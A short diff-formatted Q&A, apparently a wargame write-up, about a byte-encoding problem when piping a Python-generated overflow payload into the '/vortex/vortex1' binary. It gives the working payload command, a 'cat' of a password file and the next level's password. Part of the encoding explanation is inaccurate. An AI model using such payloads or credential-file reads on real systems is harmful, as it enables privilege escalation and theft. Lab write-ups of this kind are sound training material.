@@ -1,0 +1,21 @@
+With this problem I wasted my hours  python3 -c 'import sys; sys.stdout.write("\\" * (261) + "\xca" + "\xca")' . When i passing the output to a elf binary \xca turning into \xc3
+
+
+Solution:
+
+The difference you're observing is likely due to the interpretation of character encoding. The character \xca represents a byte with the hexadecimal value CA in ASCII encoding. When you're writing this directly into a Python string literal, Python interprets it as a Unicode character in the UTF-8 encoding, where the byte \xca corresponds to the Unicode character Ê.
+
+However, when you pass this string as input to an ELF binary or another program, the interpretation of bytes might be different. If the program expects ASCII encoding or a different encoding, the byte sequence may be interpreted differently.
+
+To maintain the exact byte sequence:
+
+
+
+(python3 -c 'import sys; sys.stdout.buffer.write(b"\\" * 261 + b"\xca" + b"\xca")'; cat) | /vortex/vortex1
+
+
+This ensures that \xca is treated as a single byte with the value 0xCA, preserving its exact representation when passed to another program.
+
+cat /etc/vortex_pass/vortex2
+
+kPNds22Ru
